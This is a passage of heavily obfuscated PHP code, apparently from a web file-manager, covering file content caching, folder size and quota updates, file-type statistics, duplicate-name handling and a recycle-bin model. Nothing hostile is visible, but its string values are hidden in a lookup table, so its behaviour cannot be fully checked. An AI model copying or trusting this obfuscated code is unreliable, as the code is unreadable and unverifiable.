$½Š½ÕÈ© = $this->where(array($ËòåèéÈ[500] => $õÌÊÌ‰Ã))->data($¯¶×·„½)->save(); $ğÊ´˜ºö = $ËòåèéÈ[2271] . $¹Œ¶œÎ[$ËòåèéÈ[202]]; if (isset(self::$cacheChildList[$ğÊ´˜ºö])) { unset(self::$cacheChildList[$ğÊ´˜ºö]); } return $½Š½ÕÈ©; } public function setNamePinyin($ÏÛ†Œê, $â­÷Ñ…Ø, $ÑÖõÍäê = true) { $ú“ê½½— =& $_SERVER[ÕŸ²ó÷å]; $±ûÅ¾Ì = Input::check($â­÷Ñ…Ø, $ú“ê½½—[664]); $Òµæõå… = array($ú“ê½½—[526] => KodSort::makeStr($â­÷Ñ…Ø)); if ($±ûÅ¾Ì) { $Òµæõå…[$ú“ê½½—[547]] = str_replace($ú“ê½½—[53], $ú“ê½½—[12], Pinyin::get($â­÷Ñ…Ø)); $Òµæõå…[$ú“ê½½—[546]] = Pinyin::get($â­÷Ñ…Ø, $ú“ê½½—[665]); } if (!$ÑÖõÍäê && !$±ûÅ¾Ì) { $Òµæõå…[$ú“ê½½—[547]] = null; $Òµæõå…[$ú“ê½½—[546]] = null; } $this->metaSet($ÏÛ†Œê, $Òµæõå…); } public function getContent($¾Èİ¯¶œ) { $ ¿³İï· =& $_SERVER[ÕŸ²ó÷å]; $Ó²şµı¾ = $this->fileInfoGet($¾Èİ¯¶œ); if (!$Ó²şµı¾) { return !1; } if ($Ó²şµı¾[$ ¿³İï·[89]] == 0) { return $ ¿³İï·[12]; } $±²ğÔĞ³ = $ ¿³İï·[2285] . $Ó²şµı¾[$ ¿³İï·[556]]; if ($Ó²şµı¾[$ ¿³İï·[89]] <= 1024 * 10) { $óÉÓ·ø = Cache::get($±²ğÔĞ³); if (!$óÉÓ·ø) { $óÉÓ·ø = IO::getContent($Ó²şµı¾[$ ¿³İï·[97]]); Cache::set($±²ğÔĞ³, $óÉÓ·ø); } return $óÉÓ·ø; } if (!$Ó²şµı¾[$ ¿³İï·[97]]) { return $ ¿³İï·[12]; } return IO::getContent($Ó²şµı¾[$ ¿³İï·[97]]); } public function setDesc($½ï§¸„Ÿ, $—˜øé‰Ø) { $îÖœÙõœ =& $_SERVER[ÕŸ²ó÷å]; Model($îÖœÙõœ[642])->eventAddDesc($½ï§¸„Ÿ, $—˜øé‰Ø); return $this->metaSet($½ï§¸„Ÿ, $îÖœÙõœ[535], $—˜øé‰Ø); } public function setContent($Ë¥ÊĞëê, $´áòÙÑÑ = '') { $’­³ÄÚ¬ =& $_SERVER[ÕŸ²ó÷å]; $şÔ„êŸˆ = $this->sourceInfo($Ë¥ÊĞëê); $ÏšŞ‹Àé = $this->fileInfoGet($Ë¥ÊĞëê); if (!$ÏšŞ‹Àé || !$şÔ„êŸˆ) { return !1; } $ë•åßÆš = Model($’­³ÄÚ¬[553])->addFileByContent($´áòÙÑÑ, $şÔ„êŸˆ[$’­³ÄÚ¬[32]]); $î ªÀÈ£ = $this->fileHistory($şÔ„êŸˆ, $ë•åßÆš[$’­³ÄÚ¬[550]], $ë•åßÆš[$’­³ÄÚ¬[89]]); if (!$î ªÀÈ£) { return Model($’­³ÄÚ¬[553])->remove($ë•åßÆš[$’­³ÄÚ¬[550]]); } $this->folderSizeReset($şÔ„êŸˆ[$’­³ÄÚ¬[202]]); return !0; } public function fileSubstr($„¸â›àü, $‰ªŠ¥ÇÉ, $Ç§×¨ƒŞ) { $«º½æ­æ = $this->fileInfoGet($„¸â›àü); if (!$«º½æ­æ) { return !1; } return IO::fileSubstr($«º½æ­æ[$_SERVER[ÕŸ²ó÷å][97]], $‰ªŠ¥ÇÉ, $Ç§×¨ƒŞ); } public function fileInfoGet($šø³‰Ô«) { $³›¯ú¦¡ =& $_SERVER[ÕŸ²ó÷å]; $åùÏ¢ı¸ = $this->sourceInfo($šø³‰Ô«); if (!$åùÏ¢ı¸ || $åùÏ¢ı¸[$³›¯ú¦¡[494]]) { return !1; } $àãÔ£õ– = $³›¯ú¦¡[557] . $åùÏ¢ı¸[$³›¯ú¦¡[550]]; $•Ê¶¢øı = _get(self::$cacheFileInfo, $àãÔ£õ–); if ($•Ê¶¢øı) { return $•Ê¶¢øı; } $‡Æªê = Model($³›¯ú¦¡[553])->fileInfo($åùÏ¢ı¸[$³›¯ú¦¡[550]]); if ($‡Æªê) { $‡Æªê[$³›¯ú¦¡[32]] = $åùÏ¢ı¸[$³›¯ú¦¡[32]]; } self::$cacheFileInfo[$àãÔ£õ–] = $‡Æªê; return $‡Æªê; } private function folderChildrenNumber($ëº«İÖ) { $ŸÏ‹–ï¢ =& $_SERVER[ÕŸ²ó÷å]; $Íò¸Ç±Ã = $this->sourceInfo($ëº«İÖ); $Ø÷Ñ»Àô = array($ŸÏ‹–ï¢[661] => array($ŸÏ‹–ï¢[621], $Íò¸Ç±Ã[$ŸÏ‹–ï¢[593]] . $ëº«İÖ . $ŸÏ‹–ï¢[622]), $ŸÏ‹–ï¢[658] => $Íò¸Ç±Ã[$ŸÏ‹–ï¢[578]], $ŸÏ‹–ï¢[513] => intval($Íò¸Ç±Ã[$ŸÏ‹–ï¢[514]]), $ŸÏ‹–ï¢[655] => 1); $½Õ²ÆÒ” = $this->where($Ø÷Ñ»Àô)->count(); $úüÓû¹Ë = $this->where($Ø÷Ñ»Àô)->where(array($ŸÏ‹–ï¢[655] => 0))->count(); return array($ŸÏ‹–ï¢[93] => $úüÓû¹Ë, $ŸÏ‹–ï¢[94] => $½Õ²ÆÒ”); } public function pathInfo($û­¶¼ö¿, $÷¸ËÁ÷ = false) { $Œø¾õ¶ =& $_SERVER[ÕŸ²ó÷å]; $÷¸ËÁ÷ = !1; $û­¶¼ö¿ = intval($û­¶¼ö¿); $øÒƒ¸´ç = $Œø¾õ¶[543] . intval($÷¸ËÁ÷) . $Œø¾õ¶[471] . $û­¶¼ö¿; $Œ˜ñ†¾Á = _get(self::$cachePathInfo, $øÒƒ¸´ç); if ($Œ˜ñ†¾Á) { return $Œ˜ñ†¾Á; } $Ù÷ØÉÒ = $this->sourceInfo($û­¶¼ö¿); if (!$Ù÷ØÉÒ) { return !1; } $Ù÷ØÉÒ = $this->_listDataApplyItem($Ù÷ØÉÒ, $÷¸ËÁ÷); self::$cachePathInfo[$øÒƒ¸´ç] = $Ù÷ØÉÒ; return $Ù÷ØÉÒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($·é¤Ç“¸) { $ü¾Òó‹ =& $_SERVER[ÕŸ²ó÷å]; $‘Õ„‘õ˜ = _get(self::$cachePathInfoMore, $·é¤Ç“¸); if ($‘Õ„‘õ˜) { return $‘Õ„‘õ˜; } $ÉãüÀ = $this->pathInfo($·é¤Ç“¸); if (!$ÉãüÀ) { return !1; } if ($ÉãüÀ[$ü¾Òó‹[494]] == $ü¾Òó‹[101]) { $ÉãüÀ[$ü¾Òó‹[92]] = $this->folderChildrenNumber($·é¤Ç“¸); } self::$cachePathInfoMore[$·é¤Ç“¸] = $ÉãüÀ; return $ÉãüÀ; } public function sourceInfo($µ˜èÕû«) { $¡¢Æ¹î„ =& $_SERVER[ÕŸ²ó÷å]; if (!$µ˜èÕû«) { return array(); } $µ˜èÕû« = intval($µ˜èÕû«); $ŒµØçÖ” = $¡¢Æ¹î„[542] . $µ˜èÕû«; $©Á±õÆ¿ = _get(self::$cacheSourceInfo, $ŒµØçÖ”); if ($©Á±õÆ¿) { return $©Á±õÆ¿; } $ƒ÷¶şá± = $this->where(array($¡¢Æ¹î„[203] => $µ˜èÕû«))->find(); self::$cacheSourceInfo[$ŒµØçÖ”] = $ƒ÷¶şá±; return self::$cacheSourceInfo[$ŒµØçÖ”]; } public function sourceCacheClear($›Ó × = false) { self::cacheClear($›Ó ×); } public static function cacheClear($ÁÖÍ«˜İ = false) { $½†™Ôş– =& $_SERVER[ÕŸ²ó÷å]; if ($ÁÖÍ«˜İ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$½†™Ôş–[542] . $ÁÖÍ«˜İ]); unset(self::$cachePathInfoMore[$ÁÖÍ«˜İ]); unset(self::$cachePathInfo[$½†™Ôş–[2286] . $ÁÖÍ«˜İ]); unset(self::$cachePathInfo[$½†™Ôş–[2287] . $ÁÖÍ«˜İ]); } public function metaSet($óŠãÌÉ, $èêØÄ = null, $•±–ÖÔŞ = null) { $‚©ê„ = parent::metaSet($óŠãÌÉ, $èêØÄ, $•±–ÖÔŞ); if ($‚©ê„) { $this->sourceCacheClear($óŠãÌÉ); } return $‚©ê„; } public function pathInfoByPath($é…ß«é, $÷®¢¨â›) { $¢ç™Àá =& $_SERVER[ÕŸ²ó÷å]; $‘¹æ­ = !$÷®¢¨â› ? array() : explode($¢ç™Àá[8], trim($÷®¢¨â›, $¢ç™Àá[8])); $É©ŸÑ˜ë = $é…ß«é; foreach ($‘¹æ­ as $ïşùÏĞ) { $¤†°É¼² = array($¢ç™Àá[202] => $É©ŸÑ˜ë, $¢ç™Àá[32] => $ïşùÏĞ); $ì­ì… = $this->field($¢ç™Àá[2288])->where($¤†°É¼²)->select(); if (!$ì­ì…) { return !1; } $ì­ì… = array_sort_by($ì­ì…, $¢ç™Àá[514]); $É©ŸÑ˜ë = $ì­ì…[0][$¢ç™Àá[203]]; } $¤ù·ªĞà = $this->sourceInfo($É©ŸÑ˜ë); $this->pathInfoFilter($¤ù·ªĞà); return $¤ù·ªĞà; } protected function updateModifyTime($…ßâ·Ò) { $ÑÓçè =& $_SERVER[ÕŸ²ó÷å]; $³Ô®ğÎĞ = defined($ÑÓçè[2198]) ? USER_ID : 0; if (!$…ßâ·Ò) { return; } if (!is_array($…ßâ·Ò)) { $…ßâ·Ò = array($…ßâ·Ò); } foreach ($…ßâ·Ò as $™æäŒÂÈ => $ººÊ½¸Õ) { $…ßâ·Ò[$™æäŒÂÈ] = intval($ººÊ½¸Õ); $this->sourceCacheClear($ººÊ½¸Õ); } $øƒõˆõÔ = array($ÑÓçè[203] => array($ÑÓçè[7], $…ßâ·Ò)); $ªªç¨È = array($ÑÓçè[660] => $³Ô®ğÎĞ, $ÑÓçè[507] => time()); $this->where($øƒõˆõÔ)->save($ªªç¨È); } public function folderSizeReset($™Ë—Àİ , $•®¿æ·© = false) { $ƒ‹Ö¦ß =& $_SERVER[ÕŸ²ó÷å]; if ($this->statusIgnoreResetSpace) { return; } $Èéƒ šà = $this->sourceInfo($™Ë—Àİ ); $ËÃÂÔ¯ = $ƒ‹Ö¦ß[2289] . $™Ë—Àİ ; CacheLock::lock($ËÃÂÔ¯, 20); if ($•®¿æ·© === !1) { $this->sourceCacheClear($™Ë—Àİ ); $Èéƒ šà = $this->sourceInfo($™Ë—Àİ ); $ø‰ùöÂ = array($ƒ‹Ö¦ß[486] => $™Ë—Àİ , $ƒ‹Ö¦ß[513] => 0); $Ï¡ó¿Õ³ = $this->where($ø‰ùöÂ)->sum($ƒ‹Ö¦ß[89]); $•®¿æ·© = intval($Ï¡ó¿Õ³) - intval($Èéƒ šà[$ƒ‹Ö¦ß[89]]); } if ($•®¿æ·© == 0) { return CacheLock::unlock($ËÃÂÔ¯); } $¯Ş××¸ = $this->parentLevelArray($Èéƒ šà[$ƒ‹Ö¦ß[593]]); if (!$¯Ş××¸) { $¯Ş××¸ = array(); } $¯Ş××¸[] = $Èéƒ šà[$ƒ‹Ö¦ß[203]]; $ø‰ùöÂ = array($ƒ‹Ö¦ß[203] => array($ƒ‹Ö¦ß[501], $¯Ş××¸)); if ($•®¿æ·© < 0) { $ø‰ùöÂ[$ƒ‹Ö¦ß[89]] = array($ƒ‹Ö¦ß[1096], abs($•®¿æ·©)); } $this->where($ø‰ùöÂ)->setAdd($ƒ‹Ö¦ß[89], $•®¿æ·©); CacheLock::unlock($ËÃÂÔ¯); $Ê“ëï¶ó = $ƒ‹Ö¦ß[2290] . $Èéƒ šà[$ƒ‹Ö¦ß[200]] . $ƒ‹Ö¦ß[4] . $Èéƒ šà[$ƒ‹Ö¦ß[578]]; $¥ùÊ÷İ° = array($Èéƒ šà[$ƒ‹Ö¦ß[200]], $Èéƒ šà[$ƒ‹Ö¦ß[578]]); TaskRun::timeLimitCall($Ê“ëï¶ó, $ƒ‹Ö¦ß[2291], $¥ùÊ÷İ°, 1.5); } public function folderSizeResetChildren($¼ÄÓğçş) { $ŒĞ”øÄÓ =& $_SERVER[ÕŸ²ó÷å]; $this->sourceCacheClear($¼ÄÓğçş); $£Ë ½ŞÉ = $this->sourceInfo($¼ÄÓğçş); $¬ÈÀ½ƒ = array($ŒĞ”øÄÓ[655] => 1, $ŒĞ”øÄÓ[658] => $£Ë ½ŞÉ[$ŒĞ”øÄÓ[578]], $ŒĞ”øÄÓ[661] => array($ŒĞ”øÄÓ[621], $£Ë ½ŞÉ[$ŒĞ”øÄÓ[593]] . $¼ÄÓğçş . $ŒĞ”øÄÓ[622])); $Ë£õû† = $ŒĞ”øÄÓ[2292]; $ÄÄÛßáİ = $this->field($Ë£õû†)->where($¬ÈÀ½ƒ)->select(); $¬ÈÀ½ƒ[$ŒĞ”øÄÓ[494]] = 0; $áÂ“ÙÛÆ = $this->field($Ë£õû†)->where($¬ÈÀ½ƒ)->select(); if (!$áÂ“ÙÛÆ) { return; } $ÄÄÛßáİ[] = $£Ë ½ŞÉ; $ÄÄÛßáİ = array_to_keyvalue($ÄÄÛßáİ, $ŒĞ”øÄÓ[203]); foreach ($ÄÄÛßáİ as $•÷ïÅ•è => $ûÌË…È˜) { $ÄÄÛßáİ[$•÷ïÅ•è][$ŒĞ”øÄÓ[2293]] = $ÄÄÛßáİ[$•÷ïÅ•è][$ŒĞ”øÄÓ[89]]; $ÄÄÛßáİ[$•÷ïÅ•è][$ŒĞ”øÄÓ[89]] = 0; } foreach ($áÂ“ÙÛÆ as $ûÌË…È˜) { $…÷‹İ»Â = $ûÌË…È˜[$ŒĞ”øÄÓ[202]] . $ŒĞ”øÄÓ[12]; if (!isset($ÄÄÛßáİ[$…÷‹İ»Â])) { continue; } if ($ûÌË…È˜[$ŒĞ”øÄÓ[514]] == $ÄÄÛßáİ[$…÷‹İ»Â][$ŒĞ”øÄÓ[514]]) { $ÄÄÛßáİ[$…÷‹İ»Â][$ŒĞ”øÄÓ[89]] += $ûÌË…È˜[$ŒĞ”øÄÓ[89]]; } } foreach ($ÄÄÛßáİ as $ûÌË…È˜) { $Áî¤™Åš = $this->parentLevelArray($ûÌË…È˜[$ŒĞ”øÄÓ[593]]); foreach ($Áî¤™Åš as $…÷‹İ»Â) { $…÷‹İ»Â = $…÷‹İ»Â . $ŒĞ”øÄÓ[12]; if (!isset($ÄÄÛßáİ[$…÷‹İ»Â])) { continue; } if ($ûÌË…È˜[$ŒĞ”øÄÓ[514]] == $ÄÄÛßáİ[$…÷‹İ»Â][$ŒĞ”øÄÓ[514]]) { $ÄÄÛßáİ[$…÷‹İ»Â][$ŒĞ”øÄÓ[89]] += $ûÌË…È˜[$ŒĞ”øÄÓ[89]]; } } } $¦ÜÔ˜á = array(); foreach ($ÄÄÛßáİ as $ûÌË…È˜) { if ($ûÌË…È˜[$ŒĞ”øÄÓ[89]] == $ûÌË…È˜[$ŒĞ”øÄÓ[2293]]) { continue; } $¦ÜÔ˜á[] = array($ŒĞ”øÄÓ[203], $ûÌË…È˜[$ŒĞ”øÄÓ[203]], $ŒĞ”øÄÓ[89], $ûÌË…È˜[$ŒĞ”øÄÓ[89]]); } $this->saveAll($¦ÜÔ˜á); } public function userSpaceReset($¹Ê±²¶— = false) { $˜ÄÛ‰Ü =& $_SERVER[ÕŸ²ó÷å]; $ÂëÖÔÖü = $this->where(array($˜ÄÛ‰Ü[200] => self::TYPE_USER, $˜ÄÛ‰Ü[578] => $¹Ê±²¶—, $˜ÄÛ‰Ü[494] => 0))->sum($˜ÄÛ‰Ü[89]); $ÂëÖÔÖü = !$ÂëÖÔÖü || $ÂëÖÔÖü <= 0 ? 0 : $ÂëÖÔÖü; Model($˜ÄÛ‰Ü[586])->userEdit($¹Ê±²¶—, array($˜ÄÛ‰Ü[1960] => $ÂëÖÔÖü)); } public function targetSpaceUpdate($ö•å´Îá, $­¾Ò×°¯) { $÷•¬ƒ˜ =& $_SERVER[ÕŸ²ó÷å]; if (!$­¾Ò×°¯) { return; } if (!in_array($ö•å´Îá, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ôáï—ğ¶ = $this->targetSpaceSize($ö•å´Îá, $­¾Ò×°¯); if ($ö•å´Îá == self::TYPE_USER) { Model($÷•¬ƒ˜[586])->userEdit($­¾Ò×°¯, array($÷•¬ƒ˜[1960] => $Ôáï—ğ¶)); } else { if ($ö•å´Îá == self::TYPE_GROUP) { Model($÷•¬ƒ˜[594])->groupEdit($­¾Ò×°¯, array($÷•¬ƒ˜[1960] => $Ôáï—ğ¶)); } } } public function targetSpaceSize($Ğàã©Ê–, $³’Ëá‹) { $ËŒ¡Ñ¥Ä =& $_SERVER[ÕŸ²ó÷å]; $‡éôÂŸ‰ = 0; $Á¹š¶°Ù = $this->targetSourceRoot($Ğàã©Ê–, $³’Ëá‹, !0); foreach ($Á¹š¶°Ù as $„Š©­Æë) { if (!$„Š©­Æë) { continue; } $‡éôÂŸ‰ += floatval($„Š©­Æë[$ËŒ¡Ñ¥Ä[89]]); $¨ıÛÆ©„ = array($ËŒ¡Ñ¥Ä[661] => array($ËŒ¡Ñ¥Ä[621], $ËŒ¡Ñ¥Ä[603] . $„Š©­Æë[$ËŒ¡Ñ¥Ä[203]] . $ËŒ¡Ñ¥Ä[622])); $œ×Ğ®˜† = Model($ËŒ¡Ñ¥Ä[512])->field($ËŒ¡Ñ¥Ä[500])->where($¨ıÛÆ©„)->select(); $œ×Ğ®˜† = array_to_keyvalue($œ×Ğ®˜†, $ËŒ¡Ñ¥Ä[12], $ËŒ¡Ñ¥Ä[203]); $œ×Ğ®˜† = array_unique(array_filter($œ×Ğ®˜†)); if ($œ×Ğ®˜†) { $¨ıÛÆ©„ = array($ËŒ¡Ñ¥Ä[500] => array($ËŒ¡Ñ¥Ä[501], $œ×Ğ®˜†)); $‡éôÂŸ‰ += floatval($this->where($¨ıÛÆ©„)->sum($ËŒ¡Ñ¥Ä[89])); } } $‡éôÂŸ‰ = !$‡éôÂŸ‰ || $‡éôÂŸ‰ <= 0 ? 0 : $‡éôÂŸ‰; return $‡éôÂŸ‰; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($«Óõ¹Ğ„) { return $this->fileTypeProfile($«Óõ¹Ğ„, SourceModel::TYPE_USER); } public function groupFileTypeProfile($úÁ„õ¢ô) { return $this->fileTypeProfile($úÁ„õ¢ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($×á÷¯×, $–úºÎÙõ) { $İã¿ŠÃÈ =& $_SERVER[ÕŸ²ó÷å]; $ñœ“ØŒ» = $İã¿ŠÃÈ[2294] . $×á÷¯× . $İã¿ŠÃÈ[11] . $–úºÎÙõ; $ÊóÚ“æÓ = Cache::get($ñœ“ØŒ»); if ($ÊóÚ“æÓ) { return $ÊóÚ“æÓ; } $Ì—îëÓ¢ = array($İã¿ŠÃÈ[655] => 0); if ($×á÷¯× != !1) { $Ì—îëÓ¢[$İã¿ŠÃÈ[578]] = $×á÷¯×; $Ì—îëÓ¢[$İã¿ŠÃÈ[200]] = $–úºÎÙõ; } $Òƒ¢”¾º = array(); $Òƒ¢”¾º[$İã¿ŠÃÈ[2295]] = array($İã¿ŠÃÈ[2296] => LNG($İã¿ŠÃÈ[2295]), $İã¿ŠÃÈ[2297] => $this->where($Ì—îëÓ¢)->count(), $İã¿ŠÃÈ[626] => $this->where($Ì—îëÓ¢)->sum($İã¿ŠÃÈ[89])); $­Â®§çğ = KodIO::fileTypeList(); foreach ($­Â®§çğ as $ÊŒ¼Øá => $Ø¥ØÅš¾) { $Ì—îëÓ¢[$İã¿ŠÃÈ[495]] = $this->fileTypeWhere($ÊŒ¼Øá); $Òƒ¢”¾º[$ÊŒ¼Øá] = array($İã¿ŠÃÈ[2296] => $Ø¥ØÅš¾[$İã¿ŠÃÈ[32]], $İã¿ŠÃÈ[2297] => $this->where($Ì—îëÓ¢)->count(), $İã¿ŠÃÈ[626] => $this->where($Ì—îëÓ¢)->sum($İã¿ŠÃÈ[89])); } Cache::set($ñœ“ØŒ», $Òƒ¢”¾º, 1200); return $Òƒ¢”¾º; } public function fileNameExist($š”öÅ, $©·ÆÜ‰ó) { $öû³å¬ç =& $_SERVER[ÕŸ²ó÷å]; $èöÃ°Ò® = $this->field($öû³å¬ç[2298])->where(array($öû³å¬ç[202] => $š”öÅ, $öû³å¬ç[32] => $©·ÆÜ‰ó, $öû³å¬ç[514] => 0))->find(); return is_array($èöÃ°Ò®) ? $èöÃ°Ò®[$öû³å¬ç[203]] : !1; } public function childList($Å²“¿Àß) { $Ææ‹¡‰Ù =& $_SERVER[ÕŸ²ó÷å]; $¡‘Ë¦ëæ = $Ææ‹¡‰Ù[2271] . $Å²“¿Àß; if (isset(self::$cacheChildList[$¡‘Ë¦ëæ])) { return self::$cacheChildList[$¡‘Ë¦ëæ]; } $ÅÊİ¥× = array($Ææ‹¡‰Ù[202] => intval($Å²“¿Àß), $Ææ‹¡‰Ù[514] => 0); $šÂø•Ûˆ = $this->where($ÅÊİ¥×)->select(); $šÂø•Ûˆ = $šÂø•Ûˆ ? $šÂø•Ûˆ : array(); self::$cacheChildList[$¡‘Ë¦ëæ] = $šÂø•Ûˆ; foreach ($šÂø•Ûˆ as $ãê¯Ù°¤) { $¡‘Ë¦ëæ = $Ææ‹¡‰Ù[542] . $ãê¯Ù°¤[$Ææ‹¡‰Ù[203]]; self::$cacheSourceInfo[$¡‘Ë¦ëæ] = $ãê¯Ù°¤; } return $šÂø•Ûˆ; } public function fileNameAuto($åİóßÔ , $Š”šè Ÿ, $äğ˜‡ìİ = REPEAT_RENAME, $¨«‘„… = false) { $öêêŸ«õ =& $_SERVER[ÕŸ²ó÷å]; $‘³éúÚ = get_path_ext($Š”šè Ÿ); $¼ÎôŸ ş = $‘³éúÚ ? get_path_ext_name($Š”šè Ÿ) . $öêêŸ«õ[2299] . $‘³éúÚ : $Š”šè Ÿ . $öêêŸ«õ[469]; $¥¸ÂÎë› = array($öêêŸ«õ[202] => $åİóßÔ , $öêêŸ«õ[514] => 0, $öêêŸ«õ[32] => array($öêêŸ«õ[468], $¼ÎôŸ ş)); $¬ÆòüÏ = $this->field($öêêŸ«õ[32])->where($¥¸ÂÎë›)->select(); $ÉÍ¾ÊÖ¬ = array_to_keyvalue($¬ÆòüÏ, $öêêŸ«õ[12], $öêêŸ«õ[32]); return $this->fileNameAutoGet($ÉÍ¾ÊÖ¬, $Š”šè Ÿ, $äğ˜‡ìİ, $¨«‘„…); } public function fileNameAutoGet($Ï„Îá»Ä, $ŠÏù¦°Ï, $Ú öÏ Š, $Åßü²Ùü) { $¶Óù¾š =& $_SERVER[ÕŸ²ó÷å]; if ($Ú öÏ Š == REPEAT_REPLACE || !$Ï„Îá»Ä || !in_array_not_case($ŠÏù¦°Ï, $Ï„Îá»Ä) || $Åßü²Ùü && $Ú öÏ Š != REPEAT_RENAME_FOLDER) { return $ŠÏù¦°Ï; } if ($Ú öÏ Š == REPEAT_SKIP) { return !1; } $­Ä†¼ = $¶Óù¾š[10] . get_path_ext($ŠÏù¦°Ï); $­Ä†¼ = $­Ä†¼ == $¶Óù¾š[10] || $Åßü²Ùü ? $¶Óù¾š[12] : $­Ä†¼; for ($«ôİ¤î¸ = 1; $«ôİ¤î¸ <= count($Ï„Îá»Ä) + 1; $«ôİ¤î¸++) { $§Ã¿îÔâ = substr($ŠÏù¦°Ï, 0, strlen($ŠÏù¦°Ï) - strlen($­Ä†¼)); $Ô‰ˆı« = $§Ã¿îÔâ . "\x28{$«ôİ¤î¸}\x29{$­Ä†¼}"; if (!in_array_not_case($Ô‰ˆı«, $Ï„Îá»Ä)) { return $Ô‰ˆı«; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\143\x65\x5f\x72\x65\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\162\x74", "\146\165\x6e\x63\x74\x69\x6f\156")); public function listData($ªÔ€¾²¾ = false) { $¤«²«õ› =& $_SERVER[ÕŸ²ó÷å]; $ªÔ€¾²¾ = $ªÔ€¾²¾ ? $ªÔ€¾²¾ : USER_ID; $¬·¦Ò† = $this->where(array($¤«²«õ›[1764] => $ªÔ€¾²¾))->select(); return array_to_keyvalue($¬·¦Ò†, $¤«²«õ›[12], $¤«²«õ›[203]); } public function moveToRecycle($ÌÅ³Ò˜Ê) { $ûæò¬¹– =& $_SERVER[ÕŸ²ó÷å]; $À÷ÓÁıª = Model($ûæò¬¹–[1421]); $ÕĞóäÎİ = $À÷ÓÁıª->sourceInfo($ÌÅ³Ò˜Ê); if (!$ÕĞóäÎİ || $ÕĞóäÎİ[$ûæò¬¹–[514]] == $ûæò¬¹–[101]) { return; } $›ÅµÖ’• = array($ûæò¬¹–[500] => $ÌÅ³Ò˜Ê, $ûæò¬¹–[1764] => USER_ID, $ûæò¬¹–[657] => $ÕĞóäÎİ[$ûæò¬¹–[200]], $ûæò¬¹–[658] => $ÕĞóäÎİ[$ûæò¬¹–[578]], $ûæò¬¹–[661] => $ÕĞóäÎİ[$ûæò¬¹–[593]]); $this->add($›ÅµÖ’•); $this->recycleMove($ÌÅ³Ò˜Ê, 1); if ($ÕĞóäÎİ[$ûæò¬¹–[494]] == $ûæò¬¹–[101]) { $—Ğß›°Ù = array($ûæò¬¹–[661] => array($ûæò¬¹–[621], $ÕĞóäÎİ[$ûæò¬¹–[593]] . $ÌÅ³Ò˜Ê . $ûæò¬¹–[622])); $À÷ÓÁıª->where($—Ğß›°Ù)->setField($ûæò¬¹–[514], 1); } } public function clear() { $this->remove(!1); } public function remove($Œ¿ºÛà± = false, $î™ÓÀ§Ú = false) { $‹ˆñå‚Ñ =& $_SERVER[ÕŸ²ó÷å]; $î™ÓÀ§Ú = $î™ÓÀ§Ú ? $î™ÓÀ§Ú : USER_ID; $„É‹Ä¯Ú = Model($‹ˆñå‚Ñ[1421]); $®ÕµîàÏ = $this->listData($î™ÓÀ§Ú); $Œ¿ºÛà± = $Œ¿ºÛà± === !1 ? !1 : $Œ¿ºÛà±; $£Çòá¦¼ = array(); foreach ($®ÕµîàÏ as $Ø˜û”ôš) { if ($Œ¿ºÛà± != !1 && !in_array($Ø˜û”ôš, $Œ¿ºÛà±)) { continue; } $È³Íé¯ = $„É‹Ä¯Ú->sourceInfo($Ø˜û”ôš); $„É‹Ä¯Ú->remove($Ø˜û”ôš, !1); $çü¼êéÄ = $È³Íé¯[$‹ˆñå‚Ñ[200]] . $‹ˆñå‚Ñ[11] . $È³Íé¯[$‹ˆñå‚Ñ[578]]; $£Çòá¦¼[$çü¼êéÄ] = array($‹ˆñå‚Ñ[657] => $È³Íé¯[$‹ˆñå‚Ñ[200]], $‹ˆñå‚Ñ[578] => $È³Íé¯[$‹ˆñå‚Ñ[578]]); $this->where(array($‹ˆñå‚Ñ[203] => $Ø˜û”ôš))->delete(); } foreach ($£Çòá¦¼ as $ÔÒ­×ØÀ) { $„É‹Ä¯Ú->targetSpaceUpdate($ÔÒ­×ØÀ[$‹ˆñå‚Ñ[200]], $ÔÒ­×ØÀ[$‹ˆñå‚Ñ[578]]); } } public function restore($ÈÉÚÒ±ã = false) { $¼ã«´ˆ¢ = $this->listData(); $this->_restoreSource($¼ã«´ˆ¢, $ÈÉÚÒ±ã); } public function removeUserAll($€‡ÃùÒ) { $this->remove(!1, $€‡ÃùÒ); } public function restoreItem($å‡‰“£€) { $this->_restoreSource(array($å‡‰“£€), array($å‡‰“£€)); } private function _restoreSource($à£¯¸®, $öšèöÙš) { $’šƒå—“ =& $_SERVER[ÕŸ²ó÷å]; $­×‚È = Model($’šƒå—“[1421]); $öšèöÙš = $öšèöÙš == !1 ? !1 : $öšèöÙš; if (!$à£¯¸®) { return !0; } $µÀ‡›ë = array(); foreach ($à£¯¸® as $Ô¢Ê ‘) { if ($öšèöÙš != !1 && !in_array($Ô¢Ê ‘, $öšèöÙš)) { continue; } $›ÏôğšÕ = $­×‚È->sourceInfo($Ô¢Ê ‘); $‹ºåÆœû = $­×‚È->sourceInfo($›ÏôğšÕ[$’šƒå—“[202]]); if ($‹ºåÆœû[$’šƒå—“[514]] == $’šƒå—“[101]) { continue; } $­×‚È->lockMoveStart($Ô¢Ê ‘); $this->recycleMove($Ô¢Ê ‘, 0); if ($›ÏôğšÕ[$’šƒå—“[494]] == $’šƒå—“[101]) { $üãŞ±òŒ = array($’šƒå—“[661] => array($’šƒå—“[621], $›ÏôğšÕ[$’šƒå—“[593]] . $Ô¢Ê ‘ . $’šƒå—“[622])); $­×‚È->where($üãŞ±òŒ)->setField($’šƒå—“[514], 0); $this->restoreFolderChildren($Ô¢Ê ‘, $à£¯¸®); } $this->where(array($’šƒå—“[203] => $Ô¢Ê ‘))->delete(); $­×‚È->folderSizeReset($›ÏôğšÕ[$’šƒå—“[202]]); $µÀ‡›ë[] = $›ÏôğšÕ[$’šƒå—“[202]]; if ($›ÏôğšÕ[$’šƒå—“[494]] == $’šƒå—“[101]) { $µÀ‡›ë[] = $Ô¢Ê ‘; } $­×‚È->lockMoveEnd($Ô¢Ê ‘); } $­×‚È->updateModifyTime($µÀ‡›ë); } private function restoreFolderChildren($œÏ°Ÿœ, 